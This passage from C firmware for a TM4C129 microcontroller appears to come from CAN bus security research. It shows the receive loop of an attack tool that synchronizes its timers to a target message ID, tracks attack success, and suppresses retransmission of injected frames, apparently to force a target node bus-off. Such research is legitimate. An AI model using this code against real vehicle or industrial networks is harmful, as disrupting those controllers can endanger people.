Ipsitakoley/tm4c129-canbus/sae-benchmark/timers.c
            got_message(msg_id, true);

            if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
                uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
                // INTERVAL << 4 is Magic.
                if (g_target_id == TARGET_ID && last_target_rcv && last_target_rcv - now > (INTERVAL<<2)) {
                    // more magic... sometimes it switches early, so ignore the startup
                    if (count > 200) {
                        attack1_success = do_switch(count);
                    }
                }
                // Disable retransmission of the attack when the preceded message is received
                // TODO: predict when the target will be bus-off?
                if ( PRECEDED_ID != HIGH_PRIO_ID && g_target_id == TARGET_ID ) {
                    if (msg_id == PRECEDED_ID ) {
                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
                    }
                } else if (PRECEDED_ID_2 != HIGH_PRIO_ID && g_target_id == TARGET_ID_2) {
                    if (msg_id == PRECEDED_ID_2 ) {
                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
                    }
                } else {
                    // do nothing.
                }
            }

            if (msg_id == g_target_id) {
                last_target_rcv = TimerValueGet(TIMER3_BASE, TIMER_A);
                // check if need to resynchronize
                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
                    if (g_sync != SYNC_MODE_SYNCHED) {
                        if (g_sync == SYNC_MODE_RESET && g_msg_since_idle == 0) { /* g_msg_since_idle always 0 with SYNC_PERIOD */
                            TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
                            uint32_t delta = g_ui32LastCANIntTimer - last_target_rcv; // counting down, so start - end = delta
                            TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL-delta-(TARGET_XMIT_TIME*6)); /* FIXME: 6 is magic. */
                            TimerEnable(TIMER2_BASE, TIMER_A);
                            g_sync = SYNC_MODE_ADJUST;
                            TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
                            TimerDisable(TIMER0_BASE, TIMER_A);
                            g_tick = false;
                            count = 0;
                        }
                    }
                }
            }
#if defined(VERBOSE)
            // FIXME: print received target1 and target2 messages after attack presumed successful.
                CANErrCntrGet(CAN0_BASE, &rec, &tec);
                UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
#endif
        } // g_bRXflag

        if (g_ui32ErrFlag) {
            CANErrorHandler();
        }
    } // while(1)
}
